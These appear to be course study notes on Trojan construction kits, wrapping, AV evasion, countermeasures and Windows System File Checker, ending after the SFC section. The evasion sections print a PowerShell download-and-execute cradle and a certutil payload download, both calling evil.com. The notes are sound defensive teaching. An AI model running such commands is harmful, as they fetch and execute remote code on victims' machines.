# 🎭 Cybersecurity Study Notes — Session 13
# Trojan Wrapping · Construction Kits · Countermeasures
# Trojan Evasion · System File Verification

> [!NOTE]
> Session 13 is the direct continuation of Session 12B. Where 12B covered
> how Trojans work and how backdoors are established, Session 13 covers
> how attackers BUILD Trojans (construction kits), CONCEAL them inside
> legitimate files (wrapping), EVADE detection (AV evasion), and how
> defenders VERIFY system integrity (system file verification).

---

## 📚 Table of Contents

- [🗺️ Where This Session Fits](#-where-this-session-fits)
- [⚠️ Exam Traps & Misconceptions](#-exam-traps--misconceptions)
- [🧱 Foundation Knowledge](#-foundation-knowledge)
- [Section 1 — Trojan Construction Kits](#section-1--trojan-construction-kits)
  - [1.1 What Is a Trojan Construction Kit](#11-what-is-a-trojan-construction-kit)
  - [1.2 How Construction Kits Work](#12-how-construction-kits-work)
  - [1.3 Malware-as-a-Service (MaaS)](#13-malware-as-a-service-maas)
- [Section 2 — Wrapping Techniques](#section-2--wrapping-techniques)
  - [2.1 What Is Wrapping](#21-what-is-wrapping)
  - [2.2 Binding vs Wrapping](#22-binding-vs-wrapping)
  - [2.3 How Wrappers Work — Step by Step](#23-how-wrappers-work--step-by-step)
  - [2.4 Common Wrapping Tools](#24-common-wrapping-tools)
  - [2.5 File Format Abuse for Wrapping](#25-file-format-abuse-for-wrapping)
- [Section 3 — Trojan Evasion Techniques](#section-3--trojan-evasion-techniques)
  - [3.1 Why Evasion Is Necessary](#31-why-evasion-is-necessary)
  - [3.2 Obfuscation](#32-obfuscation)
  - [3.3 Encryption and Encoding](#33-encryption-and-encoding)
  - [3.4 Packers and Crypters](#34-packers-and-crypters)
  - [3.5 Polymorphic and Metamorphic Techniques](#35-polymorphic-and-metamorphic-techniques)
  - [3.6 Anti-Analysis Techniques](#36-anti-analysis-techniques)
  - [3.7 Living off the Land (LotL)](#37-living-off-the-land-lotl)
  - [3.8 Fileless Malware](#38-fileless-malware)
- [Section 4 — Trojan Countermeasures](#section-4--trojan-countermeasures)
  - [4.1 Host-Based Countermeasures](#41-host-based-countermeasures)
  - [4.2 Network-Based Countermeasures](#42-network-based-countermeasures)
  - [4.3 Organisational Countermeasures](#43-organisational-countermeasures)
- [Section 5 — System File Verification](#section-5--system-file-verification)
  - [5.1 What Is System File Verification](#51-what-is-system-file-verification)
  - [5.2 Windows System File Checker (SFC)](#52-windows-system-file-checker-sfc)
  - [5.3 Tripwire and File Integrity Monitoring](#53-tripwire-and-file-integrity-monitoring)
  - [5.4 Hash-Based Verification](#54-hash-based-verification)
  - [5.5 Sysinternals for Trojan Detection](#55-sysinternals-for-trojan-detection)
- [📌 Extra Notes](#-extra-notes)
- [Abbreviations Table](#abbreviations-table)
- [🔑 Keywords + Concept Map](#-keywords--concept-map)
- [⚡ Quick Reference Cheatsheet](#-quick-reference-cheatsheet)
- [✅ Session Revision Snapshot](#-session-revision-snapshot)
- [Next Session Bridge](#next-session-bridge)
- [📖 Glossary](#-glossary)

---

## 🗺️ Where This Session Fits

```
Module 05 — Security Concepts
└── Part B — Ethical Hacking (Sessions 6–20)
    ├── Sessions 6–9    : Concepts, Principles, Hacker Classes
    ├── Sessions 10–11  : Recon, Scanning, Enumeration, Passwords, DDoS
    ├── Session 12A     : Password Countermeasures · Keyloggers · Spyware
    ├── Session 12B     : Trojans · Backdoors · Types · Reverse Shells · Netcat
    ├── ▶ SESSION 13    : Trojan Construction Kits · Wrapping · Evasion
    │                     Countermeasures · System File Verification
    │                                                      ← YOU ARE HERE
    └── Sessions 14–20  : Viruses, Sniffing, DoS, Hijacking, Web Attacks...
```

**Phase position:** Session 13 closes the Trojan sub-phase.
12B established HOW Trojans work. Session 13 covers HOW attackers
BUILD and HIDE them, and HOW defenders DETECT and VERIFY integrity.
After Session 13, the module moves to Viruses and Worms (Session 14).

---

## ⚠️ Exam Traps & Misconceptions

| ❌ Misconception | ✅ Reality |
|---|---|
| A wrapper and a packer are the same thing | A wrapper BINDS two files together (Trojan + legitimate app). A packer COMPRESSES/ENCRYPTS a single executable to hide its code. Different tools, different purposes. |
| Antivirus always detects Trojans | AV detects based on signatures, heuristics, and behaviour. Packed, encrypted, polymorphic, or fileless Trojans routinely evade AV — especially zero-day variants. |
| Polymorphic malware changes its behaviour | Polymorphic malware changes its CODE/SIGNATURE while keeping the same behaviour. Metamorphic malware changes BOTH code AND behaviour. |
| System File Checker (SFC) detects all Trojans | SFC only checks Windows protected system files. It does not scan user files, application directories, or registry — Trojans planted outside system directories are not detected. |
| Fileless malware leaves no trace | Fileless malware leaves no FILE on disk but leaves traces in memory, event logs, registry, and WMI — it is not truly traceless. |
| Living off the Land means using no tools | LotL means using LEGITIMATE tools already present on the system (PowerShell, certutil, wmic) for malicious purposes — not zero tools. |
| A crypter encrypts the entire disk | A crypter encrypts the MALWARE PAYLOAD only — to hide it from AV signature scanning. At runtime, it decrypts and executes in memory. |
| Obfuscation makes code unreadable forever | Obfuscation increases analysis difficulty — it is not permanent protection. Skilled analysts using deobfuscation tools can reverse it. |

---

## 🧱 Foundation Knowledge

<details>
<summary>Click to expand — Must-know before this session</summary>

**How Antivirus Detection Works**

| Method | How It Works | Limitation |
|---|---|---|
| Signature-based | Matches file bytes against known malware signatures | Misses new/modified malware |
| Heuristic | Looks for suspicious code patterns | False positives — may miss novel patterns |
| Behaviour-based | Monitors runtime behaviour for malicious actions | Only detects after execution begins |
| Sandbox | Runs file in isolated VM — observes behaviour | Malware may detect sandbox and not execute |
| Machine learning | Model trained on malware features | Adversarial evasion possible |

**Hash Functions Recap**
- MD5: 128-bit digest — fast — broken for collision resistance
- SHA-1: 160-bit digest — deprecated
- SHA-256: 256-bit digest — current standard for file integrity
- Same file = same hash always (deterministic)
- Any change to file = completely different hash (avalanche effect)
- Used for: malware identification, file integrity verification, IOC sharing

**PE File Structure (Windows Executables)**
- PE = Portable Executable — format for .exe, .dll, .sys files
- Contains: DOS header, PE header, section headers, sections
- Sections: .text (code), .data (data), .rsrc (resources)
- AV scans PE structure for signatures in code sections
- Packers modify PE structure to hide original code

**MITRE ATT&CK Reference**
- T1027 — Obfuscated Files or Information
- T1027.002 — Software Packing
- T1027.004 — Compile After Delivery
- T1036 — Masquerading
- T1562 — Impair Defenses
- T1059 — Command and Scripting Interpreter
- T1218 — System Binary Proxy Execution (LotL)

</details>

---

## Section 1 — Trojan Construction Kits

### 1.1 What Is a Trojan Construction Kit

**WHAT:**
A Trojan construction kit (also called a RAT builder, malware builder,
or crimeware kit) is a software tool — typically with a graphical
interface — that allows an attacker to create fully functional
customised Trojans and RATs WITHOUT writing any code.

**WHY:**
Creating malware from scratch requires programming expertise.
Construction kits democratise Trojan creation — lowering the skill
barrier to near zero. A non-technical attacker can configure a
full-featured RAT in minutes by filling in a form:
C2 server IP, port, persistence method, payload type, icon.

**HOW:**
Attacker opens construction kit GUI ↓ Configures options:

C2 server IP/domain
Listening port
Persistence mechanism (registry/task)
Payload type (reverse shell / RAT / infostealer)
Icon (to look legitimate)
File name (Invoice.exe, Setup.exe) ↓ Kit generates compiled Trojan executable ↓ Attacker distributes via phishing / social engineering ↓ Victim executes → connects to attacker's C2

**Analogy:**
A construction kit is like a pizza ordering app. You do not need to
know how to make dough, prepare toppings, or operate an oven. You
choose your options from a menu, click order, and the pizza arrives.
The construction kit does all the technical work — the attacker
just configures and clicks generate.

**Key Characteristics:**
- GUI-driven — no coding required
- Produces compiled, ready-to-deploy executables
- Often includes a server component (C2 listener) alongside the
  client/payload builder
- May include built-in evasion options (pack, encrypt, obfuscate)
- Many available on dark web markets and underground forums

**MITRE ATT&CK:**
- T1587.001 — Develop Capabilities: Malware
- TA0042 — Resource Development

---

### 1.2 How Construction Kits Work

**Architecture — Two Components:**

| Component | Role | Runs On |
|---|---|---|
| **Builder / Client** | Generates the Trojan payload executable | Attacker's machine |
| **Server / Listener** | Receives connections from deployed Trojans | Attacker's C2 server |

**Builder generates payload with embedded:**
- Attacker's C2 IP or domain (hardcoded or DGA-based)
- Port number
- Reconnection interval (beacon frequency)
- Persistence method selection
- Optional: mutex name (prevents multiple infections on same host)
- Optional: process to inject into
- Optional: custom icon and file metadata

**Server component provides:**
- Dashboard showing all active infected machines (bots)
- Commands to send to individual or all bots
- File manager, keylog viewer, webcam feed, screenshot viewer
- Lateral movement and privilege escalation modules

**Notable Construction Kit Examples:**

| Kit | Category | Notable For |
|---|---|---|
| DarkComet RAT Builder | RAT | GUI builder — Syrian APT campaigns |
| njRAT Builder | RAT | Middle East/North Africa APT use |
| AsyncRAT Builder | RAT | Open-source — active 2024–2025 |
| Metasploit (msfvenom) | Framework | Professional — generates payloads for all platforms |
| Cobalt Strike | Commercial C2 | Red team standard — heavily abused by APTs |
| Gh0st RAT Builder | RAT | Chinese APT tool |
| QuasarRAT Builder | RAT | Open-source .NET — GitHub hosted |

> [!NOTE]
> Metasploit's `msfvenom` is the professional/legitimate equivalent
> of a construction kit — used by pentesters and red teams to generate
> payloads for authorised engagements. The same tool generates payloads
> used in real attacks. Context and authorisation define the difference.

---

### 1.3 Malware-as-a-Service (MaaS)

**WHAT:**
Malware-as-a-Service is the commercialisation of malware tools and
infrastructure on dark web markets — modelled directly on legitimate
Software-as-a-Service (SaaS). Customers pay a subscription or one-time
fee to access fully managed malware tools, C2 infrastructure,
technical support, and regular updates.

**WHY:**
MaaS removes ALL technical barriers. The attacker needs no malware
knowledge, no coding skill, and no C2 infrastructure. They pay,
receive a builder and access credentials, and deploy immediately.

**MaaS Ecosystem Components:**

| Component | Description | Example |
|---|---|---|
| RAT-as-a-Service | Hosted RAT builder + C2 panel | AsyncRAT on dark web |
| Stealer-as-a-Service | Infostealer + exfil dashboard | RedLine, Raccoon v2 |
| Ransomware-as-a-Service | Full ransomware + negotiation portal | LockBit, BlackCat/ALPHV |
| Botnet-as-a-Service | DDoS-for-hire botnet access | Booter/Stresser services |
| Loader-as-a-Service | Initial access payload distribution | BumbleBee, IcedID |
| Exploit-as-a-Service | Browser exploits for drive-by | Exploit kit markets |

**Real-World Case 1 — RedLine Stealer MaaS (2021–2024)**
- **Year:** 2021–2024 (sustained MaaS operation)
- **Technique:** RedLine Stealer sold as MaaS on Telegram channels
  and underground forums for $100–$200/month. Customers received
  builder, C2 panel, and technical support. No coding required.
- **Impact:** Millions of credential sets harvested. Data sold on
  Genesis Market (seized FBI 2023) and Russian Market.
  Victims included corporate employees, gamers, and banking users.
- **Lesson:** MaaS means unsophisticated attackers now deploy
  enterprise-grade credential harvesting tools. Defender response
  must assume attacker sophistication — not infer it from target value.

---

## Section 2 — Wrapping Techniques

### 2.1 What Is Wrapping

**WHAT:**
Wrapping is the technique of **combining a Trojan payload with a
legitimate, functional host program** into a single executable file.
When the victim runs the combined file, the legitimate program
executes visibly (providing expected behaviour) while the Trojan
executes silently in the background.

**WHY:**
A standalone Trojan executable raises suspicion — "why would I run
this random .exe?" A wrapped Trojan appears as a game installer,
PDF viewer, free tool, or software crack — the victim has a reason
to run it and sees expected output. The Trojan's malicious activity
is invisible behind the legitimate cover.

**HOW — Conceptual Flow:**
Legitimate program (game installer, tool) ← visible to user + Trojan payload (RAT, backdoor) ← hidden ↓ Wrapper tool combines both into one .exe ↓ Victim downloads and runs combined file ↓ Legitimate program runs → user sees expected behaviour Trojan runs simultaneously → attacker gets shell/access

**Analogy:**
Imagine a chocolate-covered pill. The patient sees and tastes
chocolate — they willingly consume it. Hidden inside is the
medicine (or in our case, the malware). The chocolate wrapper
is the legitimate program. The pill is the Trojan payload.
The patient (victim) would never swallow the pill alone —
but happily consumes it wrapped in chocolate.

---

### 2.2 Binding vs Wrapping

These terms are often used interchangeably but have a subtle distinction:

| Term | Meaning | Mechanism |
|---|---|---|
| **Binding** | Two executables merged — both run when file is executed | Both programs stored together — sequential or concurrent execution |
| **Wrapping** | Trojan concealed INSIDE the structure of the carrier file | Trojan embedded as resource or overlay — extracted and run at execution |
| **Trojanising** | Modifying a legitimate executable to add malicious code | Original binary modified — malicious code injected into existing sections |

> [!NOTE]
> For exam purposes: wrapping, binding, and file joining refer to the
> same general concept — combining Trojan with legitimate program.
> The exact terminology varies between textbooks — know all three terms
> and that they describe the same threat family.

---

### 2.3 How Wrappers Work — Step by Step

**Technical Mechanism:**
- Step 1: Attacker selects carrier file (legitimate .exe or installer) 
- Step 2: Attacker selects Trojan payload (.exe, shellcode, script) 
- Step 3: Wrapper tool combines both: - Stores both files as resources inside new executable - OR appends Trojan as overlay to legitimate executable - OR compiles new dropper that contains both as embedded data 
- Step 4: Combined file has same icon and appearance as legitimate program 
- Step 5: Victim executes combined file 
- Step 6: Dropper/wrapper code runs first: - Extracts legitimate program to temp directory → runs it - Extracts Trojan to temp directory → runs it (hidden) 
- Step 7: User sees legitimate program running Trojan running invisibly in background

**Execution Models:**

| Model | How It Works |
|---|---|
| **Sequential** | Legitimate program runs first, then Trojan runs after |
| **Concurrent** | Both run simultaneously — Trojan in background thread |
| **Conditional** | Trojan only runs if specific condition met (user is admin, specific date) |

---

### 2.4 Common Wrapping Tools

| Tool | Type | Notes |
|---|---|---|
| **msfvenom** (Metasploit) | Professional payload generator | Can inject shellcode into existing executables |
| **The Bat!** | File binder | Older GUI binder — educational reference |
| **EliteWrap** | File binder | Older tool — commonly referenced in EH textbooks |
| **iExpress** | Windows built-in | Microsoft self-extraction wizard — abused for bundling |
| **NSIS (Nullsoft)** | Legitimate installer creator | Widely abused to create trojanised installers |
| **Inno Setup** | Legitimate installer creator | Abused in malware campaigns — trojanised software |

> [!TIP]
> NSIS and Inno Setup are legitimate, widely used software installation
> frameworks. Many real software products use them. Attackers abuse them
> because the resulting files look exactly like legitimate software
> installers — AV is less likely to flag them.

---

### 2.5 File Format Abuse for Wrapping

Trojans are not only wrapped in .exe files. Many file formats are
abused to carry and execute malicious payloads:

| File Format | Abuse Method | Example |
|---|---|---|
| **Word .docx / .doc** | VBA macros execute Trojan dropper | Emotet, TrickBot delivery |
| **Excel .xlsm** | XLM macro / VBA executes payload | Various campaigns |
| **PDF** | JavaScript execution, embedded executables | PDF exploit kits |
| **CHM** (Help file) | ActiveX script execution | APT campaigns |
| **LNK** (Shortcut) | PowerShell command in shortcut target | Kovter, various APTs |
| **ISO / IMG** | Mounts as drive — bypasses MOTW | 2021–2023 campaigns post macro block |
| **OneNote .one** | Embedded attachments execute on click | 2023 campaign wave |
| **HTML / HTA** | HTML Application executes as script host | Aggressive use 2022–2024 |

> [!IMPORTANT]
> In 2022, Microsoft disabled macros by default in Office files
> downloaded from the internet (MOTW-tagged files). Attackers
> responded by shifting to ISO, IMG, LNK, OneNote, and HTML/HTA
> containers — which at the time bypassed MOTW restrictions.
> This shift happened within weeks of Microsoft's policy change.

**MITRE ATT&CK:**
- T1566.001 — Phishing: Spearphishing Attachment
- T1204.002 — User Execution: Malicious File
- T1036.005 — Masquerading: Match Legitimate Name or Location

---

## Section 3 — Trojan Evasion Techniques

### 3.1 Why Evasion Is Necessary

**WHAT:**
Antivirus, EDR, and network security tools actively scan for
and detect malicious code. Without evasion, a Trojan generated
by a construction kit would be detected and quarantined immediately.
Evasion techniques modify or conceal the Trojan to bypass detection.

**The Detection Problem for Attackers:**
New Trojan generated → AV vendor obtains sample → Signature created → AV detects all copies of that Trojan Evasion breaks this cycle by ensuring no two copies of the Trojan
produce the same signature — or by hiding the malicious code entirely.

**Evasion Target — What Is Being Bypassed:**

| Defence | Evasion Needed |
|---|---|
| Signature-based AV | Change binary signature (pack, encrypt, modify) |
| Heuristic AV | Avoid suspicious code patterns |
| Behaviour-based AV/EDR | Delay execution, blend with legitimate behaviour |
| Sandbox | Detect VM, check for user interaction, sleep |
| Network IDS | Encrypt C2, use legitimate protocols |
| Memory scanning | Inject into legitimate process |

---

### 3.2 Obfuscation

**WHAT:**
Obfuscation transforms code to make it harder to read, analyse,
and detect — without changing its functionality.

**WHY:**
Signature-based AV looks for specific byte patterns in code.
Obfuscation changes those byte patterns while preserving execution
behaviour — the code does the same thing but looks different to the AV.

**Obfuscation Techniques:**

| Technique | How It Works |
|---|---|
| **Variable renaming** | Replace meaningful names with random strings (x, a1, _q3f) |
| **Code reordering** | Rearrange code blocks without changing logic |
| **Dead code insertion** | Insert meaningless instructions that execute but do nothing |
| **String splitting** | Split strings ("cmd.exe" → "cm" + "d" + ".exe") |
| **Base64 encoding** | Encode strings/commands in Base64 — decoded at runtime |
| **ROT13/XOR encoding** | Simple encoding of payload strings |
| **Control flow flattening** | Replace if/else with switch statements — harder to follow |

**PowerShell Obfuscation Example:**
Clear command:
IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')

Obfuscated:
&([scriptblock]::Create( [System.Text.Encoding]::Unicode.GetString( [System.Convert]::FromBase64String('SQBFAF...'))))


**MITRE ATT&CK:** T1027 — Obfuscated Files or Information

---

### 3.3 Encryption and Encoding

**WHAT:**
Encryption wraps the malicious payload in a layer of encryption —
the actual malicious code is never stored in plaintext on disk.
At runtime, a small stub decrypts the payload and executes it.

**HOW:**
Malicious payload (RAT code) ↓ Encrypted with XOR / AES / RC4 key ↓ Small decryption stub prepended ↓ AV scans file → sees only encrypted data + small stub → No signature match → file passes AV scan ↓ At runtime: Stub runs → decrypts payload in memory → executes decrypted code

**Encoding vs Encryption:**

| | Encoding | Encryption |
|---|---|---|
| Key required? | ❌ No | ✅ Yes |
| Purpose | Representation change | Confidentiality |
| Reversible? | ✅ Trivially | ✅ With key |
| Examples | Base64, URL encoding | AES, XOR, RC4 |
| AV bypass? | Partial | More effective |

**MITRE ATT&CK:**
- T1027.013 — Encrypted/Encoded File
- T1140 — Deobfuscate/Decode Files or Information

---

### 3.4 Packers and Crypters

**Packers:**

**WHAT:**
A packer compresses an executable and wraps it in a small
decompression stub. When executed, the stub decompresses the
original code in memory and runs it.

**WHY:**
Originally used for legitimate file size reduction. Abused by
malware to change the on-disk binary signature while preserving
runtime behaviour.

**How packers change AV detection:**
Original Trojan.exe → known AV signature → DETECTED ↓ packed with UPX Packed.exe → different binary → no signature match → BYPASSED At runtime: stub decompresses → original code runs in memory

**Common Packers:**

| Packer | Notes |
|---|---|
| UPX | Legitimate — most common — AV now detects UPX-packed malware too |
| MPRESS | Legitimate — less common — slightly better AV bypass than UPX |
| Custom packers | Attacker-written — most effective for AV evasion |

**Crypters:**

**WHAT:**
A crypter is similar to a packer but focuses specifically on
ENCRYPTING the payload rather than just compressing it.
More effective than simple packers for AV evasion.

**Two types:**

| Type | How It Works |
|---|---|
| **Runtime crypter** | Decrypts payload in memory at execution — payload never on disk in plaintext |
| **Scan-time crypter** | Decrypts payload to temp file before execution — file briefly exists |

Runtime crypters are significantly more evasive — no plaintext
payload ever touches the disk.

**MITRE ATT&CK:** T1027.002 — Software Packing

**Real-World Case 2 — GuLoader / CloudEyE Crypter (2019–2024)**
- **Year:** 2019–2024 (ongoing)
- **Technique:** GuLoader is a shellcode-based downloader and crypter
  widely used to deliver RATs and infostealers (FormBook, Agent Tesla,
  AsyncRAT, Remcos). It encrypts payloads and downloads them from
  legitimate cloud services (Google Drive, OneDrive, Dropbox) —
  bypassing URL reputation filters AND AV signature scanning.
- **Impact:** Used in thousands of campaigns across 5 years. Delivered
  malware to corporate and personal victims globally. Legitimate cloud
  storage used as C2/payload hosting defeats domain reputation filtering.
- **Lesson:** Cloud storage (Google Drive, OneDrive) used as payload
  hosting bypasses URL blocklists and reputation checks. Defenders
  must inspect CONTENT of cloud downloads — not just the domain.

---

### 3.5 Polymorphic and Metamorphic Techniques

**Polymorphic Malware:**

**WHAT:**
Polymorphic malware encrypts its payload and changes its encryption
key and decryption stub with each infection or generation — producing
a different binary signature every time while retaining the same
underlying malicious functionality.

**HOW:**
Infection 1: Key=A7F3 → Encrypted payload version 1 → Signature X Infection 2: Key=B2C9 → Encrypted payload version 2 → Signature Y Infection 3: Key=D4E1 → Encrypted payload version 3 → Signature Z
AV signature for X does not match Y or Z — each appears as a new file.
Core malicious behaviour is identical across all three.

**Metamorphic Malware:**

**WHAT:**
Metamorphic malware goes further — it rewrites its OWN CODE
with each generation, changing the actual instructions while
preserving the logical outcome. No encryption stub is needed —
the code itself is different every time.

**Comparison:**

| | Polymorphic | Metamorphic |
|---|---|---|
| Changes signature | ✅ Yes | ✅ Yes |
| Changes encryption key | ✅ Yes | N/A (no encryption) |
| Changes actual code | ❌ No | ✅ Yes |
| Needs decryption stub | ✅ Yes | ❌ No |
| Harder to detect | Moderate | Very hard |
| Example | Virut | Simile, W32/Evol |

**MITRE ATT&CK:** T1027.010 — Command Obfuscation

---

### 3.6 Anti-Analysis Techniques

**WHAT:**
Techniques that detect when the Trojan is being analysed in a
controlled environment (sandbox, VM, debugger) and alter or
halt behaviour to prevent analysis.

**Techniques:**

| Technique | How It Works | What It Detects |
|---|---|---|
| **VM detection** | Check for VM artefacts (VMware registry keys, VirtualBox drivers, CPUID) | Sandbox / VM environment |
| **Debugger detection** | IsDebuggerPresent() API call | Analyst running debugger |
| **Timing checks** | Measure execution time — sandboxes speed up time | Sandbox time acceleration |
| **Sleep/delay** | Sleep for 5–10 minutes before executing | Sandbox timeout (most run for 2–3 min) |
| **User interaction check** | Wait for mouse movement, keyboard input | Automated sandbox (no user) |
| **Process list check** | Look for AV/sandbox processes (Wireshark, procmon, etc.) | Analysis environment |
| **Sandbox artefact check** | Look for specific file paths, usernames ("sandbox", "malware") | Known sandbox environments |
| **Canary file check** | Check for specific file that only exists in known sandboxes | Cuckoo, Any.Run environments |

**MITRE ATT&CK:**
- T1497 — Virtualization/Sandbox Evasion
- T1497.001 — System Checks
- T1497.003 — Time Based Evasion

---

### 3.7 Living off the Land (LotL)

**WHAT:**
Living off the Land (LotL) is the technique of using legitimate,
pre-installed operating system tools and utilities to perform
malicious actions — rather than deploying custom malware tools
that could be detected.

**WHY:**
Legitimate system tools are trusted by AV and EDR. PowerShell,
certutil, mshta, regsvr32, wmic — these are Windows built-in
tools used by administrators daily. When a Trojan uses these
tools to perform its actions, security products are far less
likely to flag the activity as malicious.

**HOW:**
Instead of dropping a custom downloader Trojan:
Custom downloader → high AV detection
download_tool.exe http://evil.com/payload.exe

LotL equivalent → uses certutil.exe (built-in Windows tool)
certutil.exe -urlcache -split -f http://evil.com/payload.exe payload.exe


**Common LotL Binaries (LOLBins):**

| Binary | Legitimate Purpose | Malicious Abuse |
|---|---|---|
| **PowerShell** | Scripting/automation | Download/execute payloads, bypass AMSI |
| **certutil.exe** | Certificate management | Download files, base64 decode |
| **mshta.exe** | Run .HTA files | Execute remote malicious scripts |
| **regsvr32.exe** | Register COM objects | Execute remote scriptlets (Squiblydoo) |
| **wmic.exe** | WMI administration | Execute commands, lateral movement |
| **msiexec.exe** | Install MSI packages | Execute remote MSI payloads |
| **rundll32.exe** | Run DLL functions | Execute malicious DLLs |
| **bitsadmin.exe** | Background file transfer | Download malware |
| **cscript/wscript** | Run VBS/JS scripts | Execute malicious scripts |

> [!TIP]
> The reference website **lolbas-project.github.io** documents every
> known Windows binary that can be abused for LotL attacks — including
> the exact command syntax attackers use. This is a key defender
> resource for building detection rules.

**MITRE ATT&CK:**
- T1218 — System Binary Proxy Execution
- T1059.001 — PowerShell
- T1218.011 — Rundll32
- T1218.010 — Regsvr32

---

### 3.8 Fileless Malware

**WHAT:**
Fileless malware executes entirely in memory — no malicious
file is written to disk. The payload is injected directly into
legitimate running processes or executed through script interpreters
(PowerShell, WScript) that operate in memory.

**WHY:**
Most AV tools scan files on disk. If no malicious file exists
on disk — there is nothing to scan. Fileless malware bypasses
file-based detection entirely.

**HOW — Common Fileless Execution Chain:**
Phishing email → malicious Office macro ↓ Macro runs PowerShell (built-in — not a file) ↓ PowerShell downloads shellcode from C2 (stays in memory) ↓ Shellcode injected into legitimate process (explorer.exe) ↓ RAT runs inside explorer.exe — no file on disk ↓ AV scans disk → finds nothing

**Persistence without files:**

| Method | How |
|---|---|
| Registry (PowerShell payload) | Malicious PS1 script stored in registry value — run from registry |
| WMI subscription | Malicious command stored in WMI repository — triggers on events |
| Scheduled task (command inline) | Task runs PowerShell -EncodedCommand directly |

**Detection of Fileless Malware:**
- Memory forensics (Volatility) — scan process memory
- PowerShell script block logging (Windows Event 4104)
- AMSI (Antimalware Scan Interface) — scans scripts before execution
- EDR process behaviour monitoring

**MITRE ATT&CK:**
- T1059.001 — PowerShell
- T1620 — Reflective Code Loading
- T1055 — Process Injection

---

## Section 4 — Trojan Countermeasures

### 4.1 Host-Based Countermeasures

**WHAT:**
Host-based countermeasures are controls applied directly on the
endpoint — the workstation, server, or device — to prevent Trojan
installation, detect active Trojans, and limit their capability.

**Prevention Controls:**

| Control | What It Does |
|---|---|
| **Application Whitelisting** | Only approved executables can run — blocks all unknown Trojans |
| **Disable Macros by Default** | Prevents Office document macro Trojans |
| **User Account Control (UAC)** | Prompts for elevation — limits Trojan privilege escalation |
| **Disable Autorun/Autoplay** | Prevents USB drop Trojans from auto-executing |
| **Software Restriction Policies** | Block execution from %TEMP%, %APPDATA% — common Trojan drop locations |
| **MOTW Enforcement** | Mark of the Web — warns user on files downloaded from internet |
| **Secure Boot + UEFI** | Prevents boot-level Trojan persistence |
| **Driver Signature Enforcement** | Blocks unsigned kernel-mode Trojan drivers |

**Detection Controls:**

| Control | What It Detects |
|---|---|
| **EDR (CrowdStrike, Defender ATP)** | Behavioural detection — process injection, suspicious child processes |
| **AMSI** (Antimalware Scan Interface) | Scans PowerShell/VBScript before execution — catches fileless payloads |
| **Autoruns (Sysinternals)** | Shows ALL persistence mechanisms — Registry, Tasks, Services, Drivers |
| **Process Monitor (Sysinternals)** | Real-time file, registry, process activity |
| **Netstat -antp** | Shows all listening ports and established connections |
| **Windows Defender Credential Guard** | Prevents credential dumping from LSASS |

> [!IMPORTANT]
> **AMSI (Antimalware Scan Interface)** is a Windows 10+ feature that
> allows AV engines to scan script content BEFORE execution — even if
> the script is obfuscated, Base64-encoded, or downloaded from memory.
> It is the primary defence against PowerShell-based fileless Trojans.
> Attackers frequently attempt AMSI bypass as a first step.

**MITRE ATT&CK — Defences Impaired by Trojans:**
- T1562.001 — Impair Defenses: Disable or Modify Tools
- T1562.004 — Impair Defenses: Disable or Modify Firewall

---

### 4.2 Network-Based Countermeasures

**WHAT:**
Network-based countermeasures monitor and filter traffic at the
network level — detecting and blocking Trojan C2 communication,
data exfiltration, and lateral movement.

| Control | What It Does |
|---|---|
| **Next-Gen Firewall (NGFW)** | Deep packet inspection — blocks C2 on non-standard ports |
| **Proxy with SSL Inspection** | Decrypts and inspects HTTPS — detects C2 in encrypted traffic |
| **IDS/IPS (Snort, Suricata)** | Signature + anomaly detection for Trojan traffic patterns |
| **DNS Filtering (DNS sinkholing)** | Blocks known malicious domains — sinkhole DGA domains |
| **Network Traffic Analysis (NTA)** | Detects beaconing, DGA, unusual data volumes |
| **Web Proxy / URL Filtering** | Blocks access to known malicious URLs and file downloads |
| **Email Gateway Filtering** | Sandboxes attachments before delivery — primary Trojan vector |
| **Network Segmentation** | Limits lateral movement if one host is compromised |
| **Egress Filtering** | Controls outbound connections — catches reverse shell traffic |

> [!WARNING]
> Without SSL/TLS inspection, reverse_https Trojans (Meterpreter,
> Cobalt Strike) are completely invisible to network monitoring tools.
> All C2 traffic appears as normal HTTPS. SSL inspection is mandatory
> for effective network-level Trojan detection.

---

### 4.3 Organisational Countermeasures

| Control | What It Addresses |
|---|---|
| **User Awareness Training** | Phishing recognition — primary Trojan delivery vector |
| **Email Security (DMARC/SPF/DKIM)** | Prevents spoofed sender addresses in phishing campaigns |
| **Patch Management** | Closes drive-by download and exploit-based delivery vectors |
| **Principle of Least Privilege** | Limits Trojan capability if user has low privileges |
| **Software Inventory Management** | Detects unauthorised software (Trojan disguised as tool) |
| **Incident Response Plan** | Defined steps when Trojan infection confirmed |
| **Threat Intelligence Feeds** | Block known C2 IPs, domains, hashes at firewall/proxy |
| **Supply Chain Verification** | Hash-verify all third-party software before deployment |
| **Removable Media Policy** | Restrict USB usage — closes USB drop vector |

---

## Section 5 — System File Verification

### 5.1 What Is System File Verification

**WHAT:**
System file verification is the process of checking whether
critical operating system files and application files have been
modified, replaced, or tampered with — typically by comparing
current file state against a known-good baseline.

**WHY:**
Trojans often replace or modify legitimate system files to
establish persistence or hide their presence. A modified
svchost.exe, explorer.exe, or kernel driver that looks
legitimate but contains injected malicious code is a classic
post-compromise technique. File verification detects this.

**HOW — Two Approaches:**
Approach 1 — Hash Comparison: Known-good hash stored → Current file hashed → Compare If hashes match → File unmodified ✅ If hashes differ → File tampered ❌ → Investigate

Approach 2 — Baseline Snapshot: Clean system snapshot taken → All file hashes recorded After suspected compromise → Re-scan all files → Compare Any new or modified file → Potential IOC

**MITRE ATT&CK — What This Detects:**
- T1036.005 — Masquerading: Match Legitimate Name or Location
- T1070.006 — Indicator Removal: Timestomp
- T1543 — Create or Modify System Process

---

### 5.2 Windows System File Checker (SFC)

**WHAT:**
SFC (System File Checker) is a built-in Windows utility that
scans and repairs protected Windows system files. It compares
current system files against a cached copy stored in the
Windows Component Store (WinSxS folder).

**WHY:**
Provides a built-in, zero-cost first-line check for tampered
Windows system files. No third-party tool required.

**Key Commands:**
sfc /scannow → Scans ALL protected system files → Repairs corrupted/modified files automatically → Results logged to %WINDIR%\Logs\CBS\CBS.log

sfc /verifyonly → Scans but does NOT repair — report only

sfc /scanfile=C:\Windows\System32\svchost.exe → Scan and repair a specific file only

sfc /verifyfile=C:\Windows\System32\svchost.exe → Verify a specific file only — no repair


**Limitations of SFC:**

| Limitation | Detail |
|---|---|
| Windows files only | Does not scan user files or third-party apps |
| No registry scanning | Trojan persistence via registry not detected |
| Offline required for some repairs | Some repairs only work in Windows RE |
| Rootkit blind spot | Rootkit hiding modified files fools SFC |
